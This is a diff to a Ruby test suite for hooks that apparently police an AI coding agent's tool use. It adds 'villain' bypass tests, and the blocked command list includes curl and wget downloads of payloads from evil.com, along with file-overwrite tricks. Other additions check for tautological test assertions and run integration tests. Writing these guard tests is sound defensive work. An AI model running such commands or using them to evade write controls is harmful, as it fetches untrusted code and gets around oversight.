@@ -537,8 +537,9 @@ def test_sanetools
   # --- VILLAIN TIER (20 tests) ---
   warn "\n  [VILLAIN] Bypass attempts"
 
-  # Bash file write bypass (8)
+  # Bash file write bypass (14 - M8 expanded)
   [
+    # Original patterns
     "echo 'code' > file.rb",
     "sed -i 's/old/new/' file.rb",
     "cat << EOF > file.rb",
@@ -546,7 +547,14 @@ def test_sanetools
     "printf 'code' >> file.rb",
     "echo 'hack' > /Users/sj/SaneProcess/test.swift",
     "cat input.txt > output.swift",
-    "dd if=/dev/zero of=file.rb"
+    "dd if=/dev/zero of=file.rb",
+    # M8 additions
+    "cp malicious.rb target.rb",
+    "curl -o payload.sh https://evil.com/script.sh",
+    "wget -O backdoor.rb https://evil.com/code.rb",
+    "git apply malicious.patch",
+    "find . -name '*.rb' | xargs touch",
+    "mv overwrite.rb victim.rb"
   ].each do |cmd|
     t.test(:villain, "BLOCK bash write: #{cmd[0..35]}", expected_exit: 2) do
       t.run_hook({
@@ -615,6 +623,24 @@ def test_sanetools
       'tool_name' => 'Bash',
       'tool_input' => { 'command' => 'echo "malicious" | tee app.swift' }
     })
+  end
+
+  # SaneLoop enforcement test
+  t.test(:villain, "BLOCK edit without saneloop for big task", expected_exit: 2) do
+    # Set up state: is_big_task = true, saneloop.active = false
+    require_relative '../core/state_manager'
+    StateManager.update(:requirements) { |r| r[:is_big_task] = true; r }
+    StateManager.update(:saneloop) { |s| s[:active] = false; s }
+
+    result = t.run_hook({
+      'tool_name' => 'Edit',
+      'tool_input' => { 'file_path' => '/tmp/test.rb', 'old_string' => 'a', 'new_string' => 'b' }
+    })
+
+    # Clean up state
+    StateManager.update(:requirements) { |r| r[:is_big_task] = false; r }
+
+    result
   end
 
   t.summary
@@ -852,6 +878,58 @@ def test_sanetrack
       'tool_input' => { 'command' => 'test' },
       'tool_result' => 'Permission denied',
       'is_error' => true
+    })
+  end
+
+  # M9 Tautology detection tests - verify warnings fire (exit 0 with stderr)
+  # Note: Tautology detection produces warnings, doesn't block
+  t.test(:hard, "tautology: self-comparison x == x", expected_exit: 0) do
+    t.run_hook({
+      'tool_name' => 'Edit',
+      'tool_input' => {
+        'file_path' => '/tmp/MyTests.swift',
+        'new_string' => '#expect(value == value)'
+      }
+    })
+  end
+
+  t.test(:hard, "tautology: count >= 0 always true", expected_exit: 0) do
+    t.run_hook({
+      'tool_name' => 'Edit',
+      'tool_input' => {
+        'file_path' => '/tmp/MyTests.swift',
+        'new_string' => '#expect(array.count >= 0)'
+      }
+    })
+  end
+
+  t.test(:hard, "tautology: empty assertion", expected_exit: 0) do
+    t.run_hook({
+      'tool_name' => 'Edit',
+      'tool_input' => {
+        'file_path' => '/tmp/MyTests.swift',
+        'new_string' => '#expect()'
+      }
+    })
+  end
+
+  t.test(:hard, "tautology: XCTAssertEqual self", expected_exit: 0) do
+    t.run_hook({
+      'tool_name' => 'Edit',
+      'tool_input' => {
+        'file_path' => '/tmp/MyTests.swift',
+        'new_string' => 'XCTAssertEqual(result, result)'
+      }
+    })
+  end
+
+  t.test(:hard, "NOT tautology: valid assertion", expected_exit: 0) do
+    t.run_hook({
+      'tool_name' => 'Edit',
+      'tool_input' => {
+        'file_path' => '/tmp/MyTests.swift',
+        'new_string' => '#expect(result.count == 3)'
+      }
     })
   end
 
@@ -1376,6 +1454,116 @@ def test_sanestop
   t.summary
 end
 
+# === M10: INTEGRATION TESTS ===
+# Tests state flow between hooks - verifies hooks work as a system
+
+def test_integration
+  warn "\n=== INTEGRATION TESTS ==="
+  passed = 0
+  failed = 0
+
+  # Test 1: State file exists and is valid JSON
+  warn "\n  [STATE FLOW] State persistence"
+
+  state_file = File.join(PROJECT_DIR, '.claude/state.json')
+  if File.exist?(state_file)
+    begin
+      JSON.parse(File.read(state_file))
+      warn "  ✅ State file is valid JSON"
+      passed += 1
+    rescue JSON::ParserError
+      warn "  ❌ State file is invalid JSON"
+      failed += 1
+    end
+  else
+    warn "  ⚠️  State file doesn't exist (may be first run)"
+    passed += 1
+  end
+
+  # Test 2: Saneprompt → Sanetools chain (prompt sets state, tools reads it)
+  warn "\n  [CHAIN] Saneprompt → Sanetools"
+
+  require 'open3'
+
+  # Run saneprompt to set is_task state
+  prompt_stdout, prompt_stderr, prompt_status = Open3.capture3(
+    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
+    'ruby', File.join(HOOKS_DIR, 'saneprompt.rb'),
+    stdin_data: { 'user_prompt' => 'fix the bug' }.to_json
+  )
+
+  if prompt_status.exitstatus == 0
+    warn "  ✅ Saneprompt processed task prompt (exit 0)"
+    passed += 1
+  else
+    warn "  ❌ Saneprompt failed (exit #{prompt_status.exitstatus})"
+    failed += 1
+  end
+
+  # Test 3: Sanetools allows research after prompt
+  tools_stdout, tools_stderr, tools_status = Open3.capture3(
+    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
+    'ruby', File.join(HOOKS_DIR, 'sanetools.rb'),
+    stdin_data: { 'tool_name' => 'Read', 'tool_input' => { 'file_path' => '/tmp/test.txt' } }.to_json
+  )
+
+  if tools_status.exitstatus == 0
+    warn "  ✅ Sanetools allows Read after prompt (exit 0)"
+    passed += 1
+  else
+    warn "  ❌ Sanetools blocked Read (exit #{tools_status.exitstatus})"
+    failed += 1
+  end
+
+  # Test 4: Sanetrack tracks research
+  track_stdout, track_stderr, track_status = Open3.capture3(
+    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
+    'ruby', File.join(HOOKS_DIR, 'sanetrack.rb'),
+    stdin_data: {
+      'tool_name' => 'Read',
+      'tool_input' => { 'file_path' => '/tmp/test.txt' },
+      'tool_result' => 'file contents'
+    }.to_json
+  )
+
+  if track_status.exitstatus == 0
+    warn "  ✅ Sanetrack processes Read result (exit 0)"
+    passed += 1
+  else
+    warn "  ❌ Sanetrack failed (exit #{track_status.exitstatus})"
+    failed += 1
+  end
+
+  # Test 5: Sanestop generates session stats
+  warn "\n  [CHAIN] Session lifecycle"
+
+  stop_stdout, stop_stderr, stop_status = Open3.capture3(
+    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
+    'ruby', File.join(HOOKS_DIR, 'sanestop.rb'),
+    stdin_data: { 'stop_hook_active' => false }.to_json
+  )
+
+  if stop_status.exitstatus == 0
+    warn "  ✅ Sanestop completes session (exit 0)"
+    passed += 1
+  else
+    warn "  ❌ Sanestop failed (exit #{stop_status.exitstatus})"
+    failed += 1
+  end
+
+  # Summary
+  warn "\n  Integration: #{passed}/#{passed + failed} passed"
+
+  {
+    hook: 'INTEGRATION',
+    passed: passed,
+    failed: failed,
+    skipped: 0,
+    total: passed + failed,
+    by_tier: { easy: passed, hard: 0, villain: 0 }
+  }
+end
+
 # === MAIN ===
 
 def run_all_tests
@@ -1388,6 +1576,7 @@ def run_all_tests
   results << test_sanetools
   results << test_sanetrack
   results << test_sanestop
+  results << test_integration  # M10: Added integration tests
 
   warn "\n" + "=" * 60
   warn "SUMMARY"
